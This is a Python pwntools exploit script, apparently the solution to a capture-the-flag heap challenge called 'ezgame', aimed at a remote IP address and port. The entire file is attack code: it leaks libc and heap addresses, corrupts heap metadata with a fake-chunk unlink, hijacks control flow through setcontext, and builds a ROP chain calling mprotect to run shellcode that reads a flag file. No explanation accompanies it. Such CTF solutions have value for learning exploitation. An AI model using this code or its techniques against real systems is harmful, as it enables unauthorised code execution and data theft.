#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./ezgame')
    elf = ELF('./ezgame')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('124.16.75.162', 31053)
    elf = ELF('./ezgame')
    libc = ELF('./libc.so.6')

def choice(c):
    p.sendlineafter('choice >> ', str(c))

def add(sz):
    choice(1)
    p.sendlineafter('size of your name: ', str(sz))

def delete(idx):
    choice(2)
    p.sendlineafter('Index : ', str(idx))

def edit(idx, name):
    choice(3)
    p.sendlineafter('Index : ', str(idx))
    p.sendafter('input your name : ', name)

def show(idx):
    choice(4)
    p.sendlineafter('Index : ', str(idx))

# leak libc
add(0x100) # 0
add(0x100) # 1
delete(0)
add(0x100) # 0
show(0)
malloc_hook = u64(p.recv(6).ljust(8, '\x00')) - 0x68
libc_base = malloc_hook - libc.sym['__malloc_hook']
info('libc_base = ' + hex(libc_base))

# leak heap
add(0x28) # 2
add(0x28) # 3
delete(2)
delete(3)
add(0x28) # 2
show(2)
heap_base = u64(p.recv(6).ljust(8, '\x00')) - 0x9e0
info('heap_base = ' + hex(heap_base))

# unlink
delete(0)
delete(1)
delete(2)
add(0xf8) # 0
fake_chunk = heap_base + 0x4d0
edit(0, p64(0) + p64(0x261) + p64(fake_chunk) + p64(fake_chunk)) # fake chunk
add(0xf8) # 1
add(0xf8) # 2
edit(1, 0xf0 * 'A' + p64(0x260))
delete(2)

# get shell
setcontext = libc_base + libc.sym['setcontext']
add(0xd8) # 2
add(0x100) # 3
add(0x100) # 4
shellcode = shellcraft.amd64.pushstr('flag').rstrip() + \
    shellcraft.amd64.linux.syscall('SYS_open', "rsp", 0).rstrip() + \
    shellcraft.amd64.linux.syscall('SYS_read', "rax", heap_base, 0x40).rstrip() + \
    shellcraft.amd64.linux.syscall('SYS_write', 1, heap_base, 0x40).rstrip()
edit(4, asm(shellcode))
sc_addr = heap_base + 0x610
edit(3, 0xf0 * 'A' + p64(setcontext + 0x35)[:7])
mprotect = libc_base + libc.sym['mprotect']
if local:
    pop_rdi_ret = libc_base + 0x0000000000021102
    pop_rsi_ret = libc_base + 0x00000000000202e8
    pop_rdx_ret = libc_base + 0x0000000000001b92
else:
    pop_rdi_ret = libc_base + 0x0000000000021112
    pop_rsi_ret = libc_base + 0x00000000000202f8
    pop_rdx_ret = libc_base + 0x0000000000001b92
payload = 0x10 * 'B' + (
    p64(heap_base) + 
    p64(pop_rsi_ret) + p64(0x3000) + 
    p64(pop_rdx_ret) + p64(7) + 
    p64(mprotect) + 
    p64(sc_addr)
).ljust(0xa0, 'A') + p64(heap_base + 0x4e0) + p64(pop_rdi_ret)
edit(0, payload)
info('func = ' + hex(setcontext + 0x35))
info('mprotect = ' + hex(mprotect))
show(3)

#gdb.attach(p)

p.interactive()

